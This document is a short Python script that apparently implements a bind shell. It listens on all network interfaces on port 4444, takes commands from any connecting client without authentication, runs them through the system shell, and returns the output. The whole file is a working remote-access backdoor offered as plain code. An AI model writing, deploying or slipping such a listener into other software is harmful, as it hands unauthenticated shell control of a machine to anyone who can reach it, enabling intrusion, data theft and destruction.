import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        if not chunk:
            break  # client disconnected
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            if not chunk:
                break
            chunks.append(chunk)

        cmd = (b''.join(chunks)).decode().strip()

        if cmd.lower() == 'exit':
            print("[+] Client requested exit. Closing connection.")
            client_socket.close()
            break

        print(f"[<] Received command: {cmd}")
        output = run_cmd(cmd)
        print(f"[>] Sending response ({len(output)} bytes)")
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    print(f"[+] Started listening on port {port}")
    

    while True:
        client_socket, addr = s.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
